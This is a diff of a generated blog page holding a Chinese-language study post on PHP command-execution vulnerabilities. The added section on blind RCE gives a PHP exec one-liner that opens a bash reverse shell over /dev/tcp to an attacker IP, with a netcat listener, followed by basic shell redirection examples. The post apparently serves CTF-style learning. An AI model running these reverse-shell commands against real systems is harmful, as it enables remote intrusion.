@@ -45,7 +45,7 @@
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
 <meta property="article:published_time" content="2025-02-05T07:42:02.000Z">
-<meta property="article:modified_time" content="2025-03-04T04:23:24.661Z">
+<meta property="article:modified_time" content="2025-03-24T04:39:03.993Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
@@ -1744,7 +1744,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     debug: "env",
     cdn: {"js":{"app":"/js/app.js","parallax":"/js/plugins/parallax.js","rightMenu":"/js/plugins/rightMenu.js","rightMenus":"/js/plugins/rightMenus.js","sites":"/js/plugins/tags/sites.js","friends":"/js/plugins/tags/friends.js","contributors":"/js/plugins/tags/contributors.js","search":"/js/search/hexo.js"},"css":{"style":"/css/style.css"}},
     default: {"avatar":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/avatar/round/3442075.svg","link":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/link/8f277b4ee0ecd.svg","cover":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/cover/76b86c0226ffd.svg","image":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/image/2659360.svg"},
-    lastupdate: new Date(1742716915715),
+    lastupdate: new Date(1742886474842),
     sidebar: {
       for_page: ["blogger","category","tagcloud","donate"],
       for_post: ["toc"],
@@ -2827,6 +2827,68 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tac flag.php||ls;</span><br></pre></td></tr></table></figure>
 
 
+
+<h2 id="7-无回显RCE"><a href="#7-无回显RCE" class="headerlink" title="7.无回显RCE"></a>7.无回显RCE</h2><p>报应来了，之前他们在说反弹shell和dnslog外带的时候不知道是什么东西，原来是用来解无回显RCE的</p>
+<h3 id="1-反弹shell"><a href="#1-反弹shell" class="headerlink" title="1.反弹shell"></a>1.反弹shell</h3><p>我们只学了php，所以只看php反弹shell和bash命令</p>
+<p>首先最简单的一个办法，就是使用php的exec函数执行反弹shell</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">攻击者：nc -nvlp <span class="number">9875</span></span><br><span class="line"></span><br><span class="line">受害者：php -r <span class="string">&#x27;exec(&quot;/usr/bin/bash -i &gt;&amp; /dev/tcp/192.168.239.128/9875 0&gt;&amp;1&quot;);&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>现在我们来了解下这个bash命令的原理</p>
+<p><strong>命令释义</strong></p>
+<p>攻击者监听端口</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 9999</span><br></pre></td></tr></table></figure>
+
+<p>nc是netcat的简写，可实现任意TCP&#x2F;UDP端口的侦听，nc可以作为server以TCP或UDP方式侦听指定端口<br>-l 监听模式，用于入站连接<br>-v 详细输出–用两个-v可得到更详细的内容<br>-p port 本地端口号</p>
+<p>受害者将输入和输出重定向到攻击者主机</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.239.128/9999 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<p>bash -i代表在本地打开一个bash</p>
+<p>&amp;后面跟上&#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port这个文件代表<strong>将标准输出和标准错误输出重定向到这个文件</strong>，也就是传递到远程vps</p>
+<p>&#x2F;dev&#x2F;tcp&#x2F;是Linux中的一个特殊设备,打开这个文件就相当于发出了一个socket调用，建立一个socket连接</p>
+<p>远程vps开启对应的端口去监听，就会接收到这个bash的标准输出和标准错误输出</p>
+<p>inux文件描述符：linux shell下有三种标准的文件描述符，分别如下：<br>0 - stdin 代表标准输入,使用&lt;或&lt;&lt;<br>1 - stdout 代表标准输出,使用&gt;或&gt;&gt;<br>2 - stderr 代表标准错误输出,使用2&gt;或2&gt;&gt;</p>
+<p>意思就是通过两次输出重定向至文件，分别实现输出和输入的重定向。</p>
+<p>第一次把输出重定向至我们的攻击服务器，第二次把输入重定向至输出，也就相当于重定向至攻击者</p>
+<h3 id="2-重定向符"><a href="#2-重定向符" class="headerlink" title="2.重定向符"></a>2.重定向符</h3><p>当我们没有回显的时候也可以选择使用重定向符将回显写入指定文件然后下载读取即可</p>
+<ul>
+<li>**<code>&gt;</code>**：覆盖输出到文件。</li>
+<li>**<code>&gt;&gt;</code>**：追加输出到文件。</li>
+<li>**<code>&lt;</code>**：从文件读取输入。</li>
+<li>**<code>2&gt;</code>**：重定向标准错误。</li>
+<li>**<code>&amp;&gt;</code>**：重定向标准输出和标准错误。</li>
+<li>**<code>|</code>**：将一个命令的输出传递给另一个命令。</li>
+</ul>
+<p><strong>1.输出重定向</strong></p>
+<p>**<code>&gt;</code>**：将命令的输出重定向到文件，覆盖文件内容。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Hello, World!&quot;</span> &gt; output.txt</span><br></pre></td></tr></table></figure>
+
+<p>如果<code>output.txt</code>不存在，则创建；若存在，内容将被覆盖。</p>
+<p>**<code>&gt;&gt;</code>**：将命令的输出追加到文件末尾。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Hello again!&quot;</span> &gt;&gt; output.txt</span><br></pre></td></tr></table></figure>
+
+<p>如果文件不存在，则创建；若存在，内容将追加到文件末尾。</p>
+<p><strong>2.输入重定向</strong></p>
+<p>**<code>&lt;</code>**：将文件内容作为命令的输入。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">wc</span> -l &lt; input.txt</span><br></pre></td></tr></table></figure>
+
+<p>统计<code>input.txt</code>的行数。</p>
+<p><strong>3.错误重定向</strong></p>
+<p>**<code>2&gt;</code>**：将标准错误重定向到文件，覆盖文件内容。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> non_existent_file 2&gt; error.log</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>如果文件不存在，错误信息将写入<code>error.log</code>，覆盖原有内容。</li>
+<li>**<code>2&gt;&gt;</code>**：将标准错误追加到文件末尾。</li>
+</ul>
+<p><strong>4. 同时重定向标准输出和标准错误</strong></p>
+<p>**<code>&amp;&gt;</code>**：将标准输出和标准错误都重定向到文件，覆盖文件内容。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> non_existent_file &amp;&gt; output.log</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>输出和错误信息都将写入<code>output.log</code>，覆盖原有内容。</li>
+<li>**<code>&amp;&gt;&gt;</code>**：将标准输出和标准错误都追加到文件末尾。</li>
+</ul>
+
   </div>
   
   
@@ -2850,10 +2912,10 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     <div class='new-meta-box'>
       
         
-          <div class="new-meta-item date" itemprop="dateModified" datetime="2025-03-04T12:23:24+08:00">
+          <div class="new-meta-item date" itemprop="dateModified" datetime="2025-03-24T12:39:03+08:00">
   <a class='notlink'>
     <i class="fa-solid fa-edit fa-fw" aria-hidden="true"></i>
-    <p>更新于：Mar 4, 2025</p>
+    <p>更新于：Mar 24, 2025</p>
   </a>
 </div>
 
@@ -2997,7 +3059,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
 
     <div class='content'>
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E4%BB%80%E4%B9%88%E6%98%AF%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E"><span class="toc-text">1.什么是命令执行漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%87%BA%E7%8E%B0%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%8E%9F%E5%9B%A0"><span class="toc-text">2.出现漏洞的原因</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E5%91%BD%E4%BB%A4%E6%8B%BC%E6%8E%A5%E7%AC%A6"><span class="toc-text">1.命令拼接符</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-Windows"><span class="toc-text">1.Windows</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-Linux"><span class="toc-text">2.Linux</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0"><span class="toc-text">2.危险函数</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-system"><span class="toc-text">1.system()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-passthru"><span class="toc-text">2.passthru()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-exec"><span class="toc-text">3.exec()</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87"><span class="toc-text">3.过滤绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E9%80%9A%E9%85%8D%E7%AC%A6"><span class="toc-text">1.通配符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%85%B3%E9%94%AE%E7%AC%A6%E8%BF%87%E6%BB%A4"><span class="toc-text">2.关键符过滤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E7%BB%BC%E5%90%88%E8%BF%87%E6%BB%A4%E7%BB%83%E4%B9%A0"><span class="toc-text">3.综合过滤练习</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87"><span class="toc-text">4.空格绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E5%85%B3%E9%94%AE%E8%AF%8D%E7%BB%95%E8%BF%87"><span class="toc-text">5.关键词绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E7%A9%BA%E5%8F%98%E9%87%8F"><span class="toc-text">6.空变量</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-%E6%97%A0%E5%8F%82RCE"><span class="toc-text">4.无参RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%87%BD%E6%95%B0"><span class="toc-text">1.函数</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-localeconv"><span class="toc-text">1.localeconv()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-current"><span class="toc-text">2.current()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-scandir"><span class="toc-text">3.scandir()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-chdir"><span class="toc-text">4.chdir()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-array-reverse"><span class="toc-text">5.array_ reverse()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-highlight-file"><span class="toc-text">6.highlight_file()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7-getcwd"><span class="toc-text">7.getcwd()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#8-dirname"><span class="toc-text">8.dirname()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#9-get-defined-vars"><span class="toc-text">9.get_defined_vars()</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E6%88%98"><span class="toc-text">实战</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-%E5%BC%82%E6%88%96%E6%8B%BC%E6%8E%A5%E5%AD%97%E7%AC%A6"><span class="toc-text">5.异或拼接字符</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-dev-null-2-1"><span class="toc-text">6. &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E4%BB%80%E4%B9%88%E6%98%AF%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E"><span class="toc-text">1.什么是命令执行漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%87%BA%E7%8E%B0%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%8E%9F%E5%9B%A0"><span class="toc-text">2.出现漏洞的原因</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E5%91%BD%E4%BB%A4%E6%8B%BC%E6%8E%A5%E7%AC%A6"><span class="toc-text">1.命令拼接符</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-Windows"><span class="toc-text">1.Windows</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-Linux"><span class="toc-text">2.Linux</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0"><span class="toc-text">2.危险函数</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-system"><span class="toc-text">1.system()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-passthru"><span class="toc-text">2.passthru()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-exec"><span class="toc-text">3.exec()</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87"><span class="toc-text">3.过滤绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E9%80%9A%E9%85%8D%E7%AC%A6"><span class="toc-text">1.通配符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%85%B3%E9%94%AE%E7%AC%A6%E8%BF%87%E6%BB%A4"><span class="toc-text">2.关键符过滤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E7%BB%BC%E5%90%88%E8%BF%87%E6%BB%A4%E7%BB%83%E4%B9%A0"><span class="toc-text">3.综合过滤练习</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87"><span class="toc-text">4.空格绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E5%85%B3%E9%94%AE%E8%AF%8D%E7%BB%95%E8%BF%87"><span class="toc-text">5.关键词绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E7%A9%BA%E5%8F%98%E9%87%8F"><span class="toc-text">6.空变量</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-%E6%97%A0%E5%8F%82RCE"><span class="toc-text">4.无参RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%87%BD%E6%95%B0"><span class="toc-text">1.函数</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-localeconv"><span class="toc-text">1.localeconv()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-current"><span class="toc-text">2.current()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-scandir"><span class="toc-text">3.scandir()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-chdir"><span class="toc-text">4.chdir()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-array-reverse"><span class="toc-text">5.array_ reverse()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-highlight-file"><span class="toc-text">6.highlight_file()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7-getcwd"><span class="toc-text">7.getcwd()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#8-dirname"><span class="toc-text">8.dirname()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#9-get-defined-vars"><span class="toc-text">9.get_defined_vars()</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E6%88%98"><span class="toc-text">实战</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-%E5%BC%82%E6%88%96%E6%8B%BC%E6%8E%A5%E5%AD%97%E7%AC%A6"><span class="toc-text">5.异或拼接字符</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-dev-null-2-1"><span class="toc-text">6. &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7-%E6%97%A0%E5%9B%9E%E6%98%BERCE"><span class="toc-text">7.无回显RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">1.反弹shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E9%87%8D%E5%AE%9A%E5%90%91%E7%AC%A6"><span class="toc-text">2.重定向符</span></a></li></ol></li></ol>
     </div>
   </section>
 
@@ -3567,7 +3629,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 </script>
 
 
-  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"Hexo","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","sameAs":["https://github.com/volantis-x"],"description":""},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://example.com/","name":"Hexo"}},{"@type":"ListItem","position":3,"item":{"@id":"http://example.com/2025/02/05/php命令执行/","name":"php命令执行"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"Hexo","url":"http://example.com/","keywords":null,"description":"","author":{"@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","description":""},"publisher":{"@type":"Organization","name":"Hexo","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"http://example.com?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","headline":"php命令执行","description":"","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2025/02/05/php%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"},"author":{"@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/"},"publisher":{"@type":"Organization","name":"Hexo","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"http://example.com/2025/02/05/php%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/","wordCount":0,"datePublished":"2025-02-05T07:42:02.000Z","dateModified":"2025-03-04T04:23:24.661Z","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
+  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"Hexo","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","sameAs":["https://github.com/volantis-x"],"description":""},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://example.com/","name":"Hexo"}},{"@type":"ListItem","position":3,"item":{"@id":"http://example.com/2025/02/05/php命令执行/","name":"php命令执行"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"Hexo","url":"http://example.com/","keywords":null,"description":"","author":{"@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","description":""},"publisher":{"@type":"Organization","name":"Hexo","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"http://example.com?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","headline":"php命令执行","description":"","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2025/02/05/php%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"},"author":{"@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/"},"publisher":{"@type":"Organization","name":"Hexo","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"http://example.com/2025/02/05/php%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/","wordCount":0,"datePublished":"2025-02-05T07:42:02.000Z","dateModified":"2025-03-24T04:39:03.993Z","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
 
 
 
